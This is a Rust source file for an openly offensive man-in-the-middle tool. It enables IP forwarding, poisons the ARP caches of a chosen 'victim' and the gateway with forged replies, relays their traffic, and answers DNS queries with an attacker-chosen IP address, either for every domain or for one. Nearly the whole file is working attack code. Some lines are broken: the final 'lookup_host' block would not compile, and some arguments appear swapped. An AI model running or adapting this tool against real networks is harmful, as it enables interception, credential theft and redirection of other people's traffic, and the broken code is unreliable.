use colored::Colorize;
use pnet::datalink::{self, Channel::Ethernet, DataLinkReceiver, DataLinkSender, NetworkInterface, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket, ArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::io::{self, Write};
use std::net::{Ipv4Addr, UdpSocket};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use trust_dns_proto::op::{Message, MessageType};
use trust_dns_proto::rr::{RData, Record, Name};
use trust_dns_proto::rr::rdata::a::A;
use trust_dns_proto::serialize::binary::{BinDecodable, BinEncodable, BinEncoder};
use dns_lookup::lookup_host;

#[cfg(target_os = "windows")]
fn enable_ip_forwarding() -> std::io::Result<()> {
    use winreg::RegKey;
    use winreg::enums::*;
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let tcpip = hklm.open_subkey_with_flags(
        "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
        KEY_WRITE,
    )?;
    tcpip.set_value("IPEnableRouter", &1u32)?;
    Ok(())
}

#[cfg(target_os = "linux")]
fn enable_ip_forwarding() -> std::io::Result<()> {
    std::fs::write("/proc/sys/net/ipv4/ip_forward", b"1")?;
    Ok(())
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, Debug)]
enum Mode {
    All,
    Domain,
}

fn get_interface_input() -> String {
    for iface in datalink::interfaces() {
        println!("{}", iface.name.red().bold());
    }
    print!("Enter interface: ");
    io::stdout().flush().unwrap();
    let mut iface = String::new();
    io::stdin().read_line(&mut iface).unwrap();
    iface.trim().to_string()
}

fn get_ip(prompt: &str) -> Ipv4Addr {
    print!("{}: ", prompt);
    io::stdout().flush().unwrap();
    let mut ip = String::new();
    io::stdin().read_line(&mut ip).unwrap();
    ip.trim().parse().unwrap()
}

fn get_mode_input() -> Mode {
    loop {
        println!("Select spoofing mode (All/Domain): ");
        let mut input = String::new();
        io::stdout().flush().unwrap();
        io::stdin().read_line(&mut input).unwrap();
        match input.trim().to_lowercase().as_str() {
            "all" => return Mode::All,
            "domain" => return Mode::Domain,
            _ => println!("Invalid mode. Please enter 'All' or 'Domain'."),
        }
    }
}

fn get_spoof_ip_input() -> Ipv4Addr {
    loop {
        print!("Enter spoof IP address: ");
        io::stdout().flush().unwrap();
        let mut ip_str = String::new();
        io::stdin().read_line(&mut ip_str).unwrap();
        match ip_str.trim().parse::<Ipv4Addr>() {
            Ok(ip) => return ip,
            Err(_) => println!("Invalid IP address. Please enter a valid IPv4 address."),
        }
    }
}

fn get_domain_input() -> Option<String> {
    print!("Enter domain to spoof (leave blank for none): ");
    io::stdout().flush().unwrap();
    let mut domain = String::new();
    io::stdin().read_line(&mut domain).unwrap();
    let domain = domain.trim();
    if domain.is_empty() {
        None
    } else {
        Some(domain.to_string())
    }
}

fn resolve_mac(interface: &NetworkInterface, sender: &mut Box<dyn DataLinkSender>, receiver: &mut Box<dyn DataLinkReceiver>, src_mac: MacAddr, src_ip: Ipv4Addr, target_ip: Ipv4Addr) -> Option<MacAddr> {
    let mut arp_buffer = [0u8; 28];
    let mut ethernet_buffer = [0u8; 42];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(src_mac);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(arp_packet.packet_mut());
    let _ = sender.send_to(ethernet_packet.packet(), None);
    let start = std::time::Instant::now();
    while start.elapsed() < Duration::from_secs(3) {
        if let Ok(packet) = receiver.next() {
            if let Some(eth) = EthernetPacket::new(packet) {
                if eth.get_ethertype() == EtherTypes::Arp {
                    if let Some(arp) = ArpPacket::new(eth.payload()) {
                        if arp.get_operation() == ArpOperations::Reply && arp.get_sender_proto_addr() == target_ip {
                            return Some(arp.get_sender_hw_addr());
                        }
                    }
                }
            }
        }
    }
    None
}

fn start_arp_spoofing_and_forwarding(
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
    rx: Arc<Mutex<Box<dyn DataLinkReceiver>>>,
    attacker_mac: MacAddr,
    victim_mac: MacAddr,
    gateway_mac: MacAddr,
    victim_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
) {
    let tx_arp = tx.clone();
    thread::spawn(move || {
        let mut arp_buffer = [0u8; 28];
        let mut ethernet_buffer = [0u8; 42];
        loop {
            {
                let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
                arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
                arp_packet.set_protocol_type(EtherTypes::Ipv4);
                arp_packet.set_hw_addr_len(6);
                arp_packet.set_proto_addr_len(4);
                arp_packet.set_operation(ArpOperations::Reply);
                arp_packet.set_sender_hw_addr(attacker_mac);
                arp_packet.set_sender_proto_addr(gateway_ip);
                arp_packet.set_target_hw_addr(victim_mac);
                arp_packet.set_target_proto_addr(victim_ip);
                let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
                ethernet_packet.set_destination(victim_mac);
                ethernet_packet.set_source(attacker_mac);
                ethernet_packet.set_ethertype(EtherTypes::Arp);
                ethernet_packet.set_payload(arp_packet.packet_mut());
                let _ = tx_arp.lock().unwrap().send_to(ethernet_packet.packet(), None);
            }
            {
                let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
                arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
                arp_packet.set_protocol_type(EtherTypes::Ipv4);
                arp_packet.set_hw_addr_len(6);
                arp_packet.set_proto_addr_len(4);
                arp_packet.set_operation(ArpOperations::Reply);
                arp_packet.set_sender_hw_addr(attacker_mac);
                arp_packet.set_sender_proto_addr(victim_ip);
                arp_packet.set_target_hw_addr(gateway_mac);
                arp_packet.set_target_proto_addr(gateway_ip);
                let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
                ethernet_packet.set_destination(gateway_mac);
                ethernet_packet.set_source(attacker_mac);
                ethernet_packet.set_ethertype(EtherTypes::Arp);
                ethernet_packet.set_payload(arp_packet.packet_mut());
                let _ = tx_arp.lock().unwrap().send_to(ethernet_packet.packet(), None);
            }
            thread::sleep(Duration::from_secs(2));
        }
    });

    let tx_forward = tx.clone();
    thread::spawn(move || {
        let mut forward_buffer = [0u8; 1600];
        loop {
            if let Ok(packet) = rx.lock().unwrap().next() {
                if let Some(eth_packet) = EthernetPacket::new(packet) {
                    let src = eth_packet.get_source();
                    let dst = eth_packet.get_destination();
                    if src == victim_mac && dst == attacker_mac {
                        let mut forward_packet = MutableEthernetPacket::new(&mut forward_buffer).unwrap();
                        forward_packet.clone_from(&eth_packet);
                        forward_packet.set_source(attacker_mac);
                        forward_packet.set_destination(gateway_mac);
                        let _ = tx_forward.lock().unwrap().send_to(forward_packet.packet(), None);
                    } else if src == gateway_mac && dst == attacker_mac {
                        let mut forward_packet = MutableEthernetPacket::new(&mut forward_buffer).unwrap();
                        forward_packet.clone_from(&eth_packet);
                        forward_packet.set_source(attacker_mac);
                        forward_packet.set_destination(victim_mac);
                        let _ = tx_forward.lock().unwrap().send_to(forward_packet.packet(), None);
                    }
                }
            }
        }
    });
}

fn start_dns_spoofer(spoof_ip: Ipv4Addr, mode: Mode, domain: Option<String>) -> std::io::Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:53")?;
    let mut buf = [0u8; 512];
    let target_domain = domain.map(|d| Name::from_ascii(format!("{}.", d.to_lowercase())).unwrap());

    loop {
        let (amt, src_addr) = socket.recv_from(&mut buf)?;
        let query = match Message::from_bytes(&buf[..amt]) {
            Ok(q) => q,
            Err(_) => continue,
        };

        let should_spoof = match mode {
            Mode::All => true,
            Mode::Domain => {
                if let Some(ref target) = target_domain {
                    query.queries().iter().any(|q| q.name().to_lowercase() == *target)
                } else {
                    false
                }
            }
        };

        let rdata = RData::A(A::from(spoof_ip));

        if should_spoof {
            let mut response = Message::new();
            response.set_id(query.id());
            response.set_message_type(MessageType::Response);
            for q in query.queries() {
                response.add_query(q.clone());
                let record = Record::from_rdata(q.name().clone(), 60, RData::A(A(spoof_ip)));
                response.add_answer(record);
            }
            let mut resp_buf = Vec::with_capacity(128);
            let mut encoder = BinEncoder::new(&mut resp_buf);
            if response.emit(&mut encoder).is_ok() {
                let _ = socket.send_to(&resp_buf, src_addr);
            }
        }
    }
}

pub(crate) fn main() -> Result<(), Box<dyn std::error::Error>> {
    enable_ip_forwarding()?;
    println!("Starting DNS/ARP spoofer... Press Ctrl+C to stop");
    let iface = get_interface_input();
    let gateway_ip = get_ip("Gateway IP");
    let victim_ip = get_ip("Victim IP");
    let mode = get_mode_input();
    let spoof_ip = get_spoof_ip_input();
    let domain = if mode == Mode::Domain { get_domain_input() } else { None };
    let interface = datalink::interfaces()
        .into_iter()
        .find(|i| i.name == iface)
        .ok_or("Interface not found")?;
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        _ => panic!("Failed to open datalink channel"),
    };
    let attacker_mac = interface.mac.ok_or("Failed to get attacker MAC")?;
    let gateway_mac = resolve_mac(&interface, &mut tx, &mut rx, attacker_mac, victim_ip, gateway_ip).ok_or("Gateway MAC not found")?;
    let victim_mac = resolve_mac(&interface, &mut tx, &mut rx, attacker_mac, gateway_ip, victim_ip).ok_or("Victim MAC not found")?;
    let tx_arc = Arc::new(Mutex::new(tx));
    let rx_arc = Arc::new(Mutex::new(rx));
    start_arp_spoofing_and_forwarding(
        tx_arc.clone(),
        rx_arc.clone(),
        attacker_mac,
        victim_mac,
        gateway_mac,
        victim_ip,
        gateway_ip,
    );
    let success = if mode == Mode::Domain{
        println!("{:?}", lookup_host(domain))
    }
    println!("DNS spoofer running on port 53");
    println!("Spoofing mode: {:?}", mode);
    if let Some(ref domain) = domain {
        println!("Spoofing domain: {}", domain);
    }
    println!("Spoofing to IP: {}", spoof_ip);
    start_dns_spoofer(spoof_ip, mode, domain)?;
    Ok(())
}
